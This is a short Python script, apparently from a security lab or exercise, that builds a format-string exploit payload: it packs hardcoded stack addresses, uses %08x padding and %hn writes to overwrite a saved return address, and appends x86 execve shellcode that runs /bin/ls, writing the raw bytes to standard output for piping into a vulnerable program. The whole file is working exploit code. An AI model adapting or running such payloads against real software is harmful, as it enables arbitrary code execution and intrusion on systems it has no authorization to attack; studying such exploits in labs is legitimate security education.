import sys
import os

def swapEndianness(hexstring):
	ba = bytearray.fromhex(hexstring)
	ba.reverse()
	return ba.hex()

SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"

ADDRESSTOWRITE = b'BFFFE58C'
                 #8C E5 FF BF
ADDRESSOFSHELL = b'\xBF\xFF\xEA\x9D'
                #9D EA FF BF
                #69 EF FF BF
ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
ADDRESSOFSHELL.reverse()
ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
ADDRESSOFSHELL1 = bytes(str(int.from_bytes(ADDRESSOFSHELL[0:2], 'big')), 'utf-8')
ADDRESSOFSHELL2 = bytes(str(int.from_bytes(ADDRESSOFSHELL[2:], 'big')), 'utf-8')
print(ADDRESSOFSHELL1)


ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(4, 'little')
ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X2
ADDRESSTOWRITE2 = ADDRESSTOWRITE2.to_bytes(4, 'little')

ADDRESSOFSTRING = b'BFFFEA58'
ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(4, 'little'))
LENTGHOFREQUIRED = 316


#print("AAAA" + str(ADDRESSTOWRITE1)[2:18] + str(ADDRESSTOWRITE2)[2:18] +  "%08x." * 320)
with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%38609x' +  b'%hn' + SHELLCODE + b'\n')